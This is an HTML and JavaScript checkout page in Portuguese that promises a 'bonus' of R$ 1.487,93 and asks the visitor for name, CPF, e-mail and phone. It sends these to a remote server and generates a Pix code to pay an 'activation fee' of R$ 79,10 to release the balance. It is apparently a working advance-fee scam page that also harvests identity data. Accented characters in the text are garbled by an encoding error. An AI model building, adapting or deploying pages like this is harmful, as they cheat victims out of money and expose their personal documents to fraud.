<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Resgate de Bonifica√ß√£o</title>

<style>
:root{
    --primary:#F04E2A;
    --dark:#1E1E1E;
    --light:#F5F5F5;
    --soft:#FBE9E4;
}

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family: 'Segoe UI', sans-serif;
}

body{
    background:linear-gradient(135deg,#f2f2f2,#e8e8e8);
    display:flex;
    justify-content:center;
    align-items:center;
    min-height:100vh;
    padding: 20px;
}

.checkout-container{
    width:100%;
    max-width:420px;
    background:white;
    border-radius:18px;
    box-shadow:0 15px 40px rgba(0,0,0,0.1);
    padding:30px;
    position:relative;
}

.badge-valor{
    position:absolute;
    top:-15px;
    right:20px;
    background:black;
    color:white;
    padding:8px 15px;
    border-radius:30px;
    font-weight:bold;
    font-size:14px;
}

.titulo{
    font-size:20px;
    margin-bottom:15px;
    font-weight:600;
}

.alerta{
    background:var(--soft);
    padding:15px;
    border-left:5px solid var(--primary);
    border-radius:8px;
    margin-bottom:20px;
}

.alerta h3{
    color:#333;
    margin-bottom:5px;
    font-size: 16px;
}

.form-group{
    margin-bottom:15px;
}

label{
    font-size:13px;
    color:#777;
    display:block;
    margin-bottom:5px;
}

input{
    width:100%;
    padding:12px;
    border-radius:8px;
    border:1px solid #ddd;
    transition:0.3s;
    font-size: 14px;
}

input:focus{
    border-color:var(--primary);
    outline:none;
    box-shadow:0 0 0 2px rgba(240,78,42,0.2);
}

.resumo{
    background:#fafafa;
    padding:15px;
    border-radius:10px;
    margin-top:15px;
    font-size:14px;
}

.linha{
    display:flex;
    justify-content:space-between;
    margin-bottom:8px;
}

.linha span:last-child{
    font-weight:600;
}

.total{
    margin-top:10px;
    padding-top:10px;
    border-top:1px solid #ddd;
    font-size:18px;
    color:var(--primary);
    font-weight:bold;
}

.btn{
    margin-top:20px;
    width:100%;
    padding:14px;
    border:none;
    border-radius:10px;
    background:var(--primary);
    color:white;
    font-size:16px;
    font-weight:bold;
    cursor:pointer;
    transition:0.3s;
}

.btn:hover{
    background:#d94120;
    transform:translateY(-2px);
}

.btn:disabled { background: #ccc; cursor: not-allowed; }

/* AREA DO QR CODE */
#pix_area {
    display: none;
    text-align: center;
    margin-top: 20px;
    padding-top: 20px;
    border-top: 2px dashed #eee;
}

#qr_img {
    width: 200px;
    height: 200px;
    margin: 10px auto;
    display: block;
    border: 1px solid #eee;
    padding: 5px;
    border-radius: 8px;
}

.pix-input {
    width: 100%;
    padding: 10px;
    background: #f4f4f4;
    border: 1px solid #ddd;
    font-size: 11px;
    text-align: center;
    margin-bottom: 10px;
    border-radius: 5px;
    outline: none;
}

</style>
</head>

<body>

<div class="checkout-container">

    <div class="badge-valor">R$ 1.487,93</div>

    <div class="titulo">Resumo Final</div>

    <div class="alerta">
        <h3>Consolida√ß√£o de Valores</h3>
        <p>Confirme seus dados abaixo para liberar o resgate da sua bonifica√ß√£o.</p>
    </div>

    <div class="form-group">
        <label>Nome Completo</label>
        <input type="text" id="nome" placeholder="Digite seu nome completo">
    </div>

    <div class="form-group">
        <label>CPF</label>
        <input type="text" id="cpf" placeholder="000.000.000-00" maxlength="14">
    </div>

    <div class="form-group">
        <label>E-mail</label>
        <input type="email" id="email" placeholder="seuemail@email.com">
    </div>

    <div class="form-group">
        <label>Telefone</label>
        <input type="text" id="telefone" placeholder="(00) 00000-0000" maxlength="15">
    </div>

    <div id="resumo_container">
        <div class="resumo">
            <div class="linha"><span>Valor Inicial</span> <span>R$ 1.342,03</span></div>
            <div class="linha"><span>Taxas Acumuladas</span> <span>+ R$ 66,80</span></div>
            <div class="linha"><span>Ativa√ß√£o Final</span> <span style="color: #28a745;">+ R$ 79,10</span></div>
            <div class="linha total"><span>VALOR TOTAL</span> <span>R$ 1.487,93</span></div>
        </div>

        <button class="btn" id="btn_gerar" onclick="gerarPix()">PROSSEGUIR PARA PAGAMENTO</button>
    </div>

    <div id="pix_area">
        <h3 id="titulo_pix" style="color: #1f9c6b; font-size: 16px;">‚úÖ PIX GERADO COM SUCESSO</h3>
        <p id="subtitulo_pix" style="font-size: 13px; color: #666; margin-top: 5px;">Pague a taxa de <b>R$ 79,10</b> para liberar seu saldo.</p>
        
        <img id="qr_img" src="" alt="QR Code Pix">
        
        <input type="text" id="pix_code" class="pix-input" readonly>
        
        <button class="btn" id="btn_copy" style="background: #28a745; margin-top: 0;" onclick="copiarPix()">COPIAR C√ìDIGO PIX</button>
    </div>

</div>

<script>
// ==========================================================
// CONFIGURA√á√ïES 
// ==========================================================
const URL_SERVIDOR = "https://checkoutfinal.onrender.com"; 

// üî¥ AQUI EST√Å A SUA P√ÅGINA DE OBRIGADO CONFIGURADA!
const URL_SUCESSO_FINAL = "https://checkoutfinal.onrender.com/obrigado.html"; 

// ==========================================================

// 2. CARREGAR DADOS AUTOM√ÅTICOS
window.onload = function() {
    const local = JSON.parse(localStorage.getItem('dadosUsuario') || '{}');
    const params = new URLSearchParams(window.location.search);

    document.getElementById('nome').value = params.get('nome') || local.nome || "";
    document.getElementById('email').value = params.get('email') || local.email || "";
    document.getElementById('cpf').value = params.get('cpf') || local.cpf || local.documento || "";
    document.getElementById('telefone').value = params.get('phone') || local.telefone || "";
};

// 3. M√ÅSCARAS
document.getElementById('cpf').addEventListener('input', function(e){
    let v = e.target.value.replace(/\D/g,'');
    v = v.replace(/(\d{3})(\d)/,'$1.$2');
    v = v.replace(/(\d{3})(\d)/,'$1.$2');
    v = v.replace(/(\d{3})(\d{1,2})$/,'$1-$2');
    e.target.value = v;
});

document.getElementById('telefone').addEventListener('input', function(e){
    let v = e.target.value.replace(/\D/g,'');
    v = v.replace(/^(\d{2})(\d)/g,'($1) $2');
    v = v.replace(/(\d{5})(\d{4})$/,'$1-$2');
    e.target.value = v;
});

// 4. FUN√á√ÉO PARA GERAR O PIX
function gerarPix() {
    const btn = document.getElementById('btn_gerar');
    
    const dados = {
        name: document.getElementById('nome').value,
        email: document.getElementById('email').value,
        cpf: document.getElementById('cpf').value.replace(/\D/g, ''),
        phone: document.getElementById('telefone').value.replace(/\D/g, ''),
        valor: "79.10" // Valor da √∫ltima taxa
    };

    if (dados.cpf.length < 11 || !dados.name) {
        alert("Por favor, preencha Nome e CPF corretamente.");
        return;
    }

    btn.innerText = "GERANDO...";
    btn.disabled = true;

    fetch(`${URL_SERVIDOR}/pix`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(dados)
    })
    .then(res => res.json())
    .then(data => {
        if(data.success) {
            // Esconde resumo e mostra a √°rea do Pix
            document.getElementById('resumo_container').style.display = 'none';
            document.getElementById('pix_area').style.display = 'block';
            
            // üëá SOLU√á√ÉO √Ä PROVA DE FALHAS PARA A IMAGEM üëá
            document.getElementById('pix_code').value = data.payload;
            document.getElementById('qr_img').src = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(data.payload)}`;

            // Inicia o monitoramento
            if(data.transactionId) monitorar(data.transactionId);

        } else {
            alert("Erro: N√£o foi poss√≠vel conectar ao banco. Tente novamente.");
            btn.innerText = "PROSSEGUIR PARA PAGAMENTO";
            btn.disabled = false;
        }
    })
    .catch(err => {
        alert("Erro de conex√£o com a internet.");
        btn.innerText = "PROSSEGUIR PARA PAGAMENTO";
        btn.disabled = false;
    });
}

// 5. MONITORAMENTO (PULA DE P√ÅGINA SOZINHO)
function monitorar(id) {
    const intervalo = setInterval(() => {
        fetch(`${URL_SERVIDOR}/check-status/${id}`)
        .then(r => r.json())
        .then(res => {
            if(res.paid) {
                clearInterval(intervalo);
                
                // UX: Avisa o cliente que deu certo antes de pular a p√°gina
                document.getElementById('titulo_pix').innerText = "üöÄ PAGAMENTO APROVADO!";
                document.getElementById('titulo_pix').style.color = "#18a558";
                document.getElementById('subtitulo_pix').innerText = "Processando seu saque, aguarde...";
                
                setTimeout(() => {
                    window.location.href = URL_SUCESSO_FINAL;
                }, 1500);
            }
        })
        .catch(e => console.log("Aguardando confirma√ß√£o..."));
    }, 3000);
}

// 6. COPIAR C√ìDIGO MELHORADO
function copiarPix() {
    const copyText = document.getElementById("pix_code");
    copyText.select();
    copyText.setSelectionRange(0, 99999);
    navigator.clipboard.writeText(copyText.value);
    
    const btnCopy = document.getElementById('btn_copy');
    btnCopy.innerText = "‚úÖ C√ìDIGO COPIADO!";
    btnCopy.style.background = "#148647"; 
    
    setTimeout(() => {
        btnCopy.innerText = "COPIAR C√ìDIGO PIX";
        btnCopy.style.background = "#28a745";
    }, 3000);
}
</script>

</body>
</html>
